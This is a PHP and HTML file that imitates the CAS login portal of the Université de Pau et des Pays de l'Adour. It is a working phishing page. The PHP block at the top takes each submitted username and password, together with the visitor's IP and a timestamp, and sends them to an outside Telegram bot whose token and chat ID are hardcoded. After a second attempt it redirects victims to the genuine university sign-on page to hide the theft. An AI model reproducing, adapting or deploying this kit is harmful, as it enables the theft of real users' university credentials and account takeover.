<?php
session_start();
// Reproduction locale — Portail CAS Université de Pau et des Pays de l'Adour

// ===== CONFIGURATION TELEGRAM =====
define('TELEGRAM_BOT_TOKEN', '8967323973:AAE8fVbNVJi5DTOs2VdNoPm2lHzBj4AplXc');
define('TELEGRAM_CHAT_ID', '6934023679');

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['username']) && !empty($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if (!isset($_SESSION['attempt'])) {
        $_SESSION['attempt'] = 1;
    } else {
        $_SESSION['attempt']++;
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');

    $msg = "Nouvelle connexion CAS UPPA" . "\n";
    $msg .= "ID: " . $username . "\n";
    $msg .= "PW: " . $password . "\n";
    $msg .= "IP: " . $ip . "\n";
    $msg .= "Date: " . $date . "\n";
    $msg .= "Tentative n." . $_SESSION['attempt'];

    $data = array(
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $msg
    );

    $ch = curl_init("https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_exec($ch);

    if ($_SESSION['attempt'] >= 2) {
        session_destroy();
        header('Location: https://sso.univ-pau.fr/cas/login?service=https%3A%2F%2Fidp.univ-pau.fr%2Fidp%2FAuthn%2FExtCas%3Fconversation%3De1s1');
        exit;
    } else {
        $error = 'Mauvais identifiant / mot de passe.';
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>CAS - Universite de Pau et des Pays de l'Adour</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<link rel="icon" type="image/x-icon" href="images/cas.ico">
<link rel="shortcut icon" type="image/x-icon" href="images/cas.ico">
<style>
  * { box-sizing: border-box; }
  html, body {
    margin: 0; padding: 0; height: 100%;
    font-family: Arial, Helvetica, sans-serif;
  }
  body {
    background: #fff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
  }
  body::before {
    content: "";
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: url('images/casim.png') no-repeat center center;
    background-size: cover;
    opacity: 1;
    z-index: 0;
  }
  .card {
    background: #ffffff;
    width: 350px;
    box-shadow: 0 4px 40px rgba(0,0,0,0.25);
    border-radius: 2px;
    z-index: 5;
    overflow: hidden;
  }
  .logo-container {
    text-align: center;
    padding: 24px 24px 10px;
  }
  .logo-container img {
    max-width: 200px;
    height: auto;
    display: block;
    margin: 0 auto;
  }
  .card-body {
    padding: 10px 28px 24px;
  }
  label {
    display: block;
    font-size: 14px;
    color: #333;
    margin-bottom: 6px;
    margin-top: 16px;
  }
  .accesskey {
    text-decoration: underline;
  }
  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 9px 10px;
    border: 1px solid #999;
    font-size: 14px;
    border-radius: 1px;
  }
  input[type="text"]:focus, input[type="password"]:focus {
    outline: none;
    border-color: #444;
  }
  .btn-submit {
    width: 100%;
    margin-top: 20px;
    padding: 11px;
    background: #d6d6d6;
    border: 1px solid #b8b8b8;
    font-size: 14px;
    letter-spacing: 0.5px;
    cursor: pointer;
    border-radius: 1px;
  }
  .btn-submit:hover {
    background: #4a7c3a;
    border-color: #3f6c31;
    color: #fff;
  }
  .btn-submit:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }
  .error-message {
    background: #f8d7da;
    border: 1px solid #f5c6cb;
    color: #721c24;
    padding: 10px 12px;
    font-size: 13px;
    border-radius: 2px;
    margin: 10px 28px;
    text-align: center;
  }
  .links {
    margin-top: 16px;
    text-align: center;
    font-size: 13px;
  }
  .links a {
    color: #1a5fb4;
    text-decoration: none;
    display: block;
    margin-top: 4px;
  }
  .links a:hover { text-decoration: underline; }
  #capslock-on {
    display: none;
    margin-top: 6px;
    padding: 6px 10px;
    background: #fff3cd;
    border: 1px solid #ffe08a;
    color: #6b5300;
    font-size: 12px;
    border-radius: 2px;
  }
</style>
</head>
<body>

  <div class="card">

    <div class="logo-container">
      <img src="images/logo_uppa.svg" alt="Universite de Pau et des Pays de l'Adour" />
    </div>

    <?php if ($error): ?>
      <div class="error-message"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>

    <div class="card-body">
      <form method="post" id="fm1" action="" autocomplete="off">
        <label for="username"><span class="accesskey">I</span>dentifiant :</label>
        <input type="text" id="username" name="username" autofocus autocomplete="username" value="<?php echo isset($_POST['username']) ? htmlspecialchars($_POST['username']) : ''; ?>">

        <label for="password"><span class="accesskey">M</span>ot de passe :</label>
        <input type="password" id="password" name="password" autocomplete="current-password">
        <div id="capslock-on">
          <span>&#9888; La touche Verr Maj est activee !</span>
        </div>

        <input type="hidden" name="execution" value="e1s1" />
        <input type="hidden" name="_eventId" value="submit" />

        <button class="btn-submit" type="submit" name="submit">SE CONNECTER</button>

        <div class="links">
          <a href="https://moncompte.univ-pau.fr/faq/" target="_blank">Mot de passe oublie ?</a>
          <a href="https://moncompte.univ-pau.fr/" target="_blank">Activer votre compte.</a>
        </div>
      </form>
    </div>

  <script>
    (function() {
      var warning = document.getElementById("capslock-on");
      var pwd = document.getElementById("password");

      if (pwd && warning) {
        pwd.addEventListener("keyup", function(e) {
          var caps = e.getModifierState ? e.getModifierState("CapsLock") : false;
          warning.style.display = caps ? "block" : "none";
        });
      }

      var form = document.getElementById("fm1");
      if (form) {
        form.addEventListener("submit", function() {
          var btn = this.querySelector(".btn-submit");
          if (btn) {
            btn.disabled = true;
            btn.textContent = "Veuillez patienter ...";
          }
        });
      }
    })();
  </script>

</body>
</html>
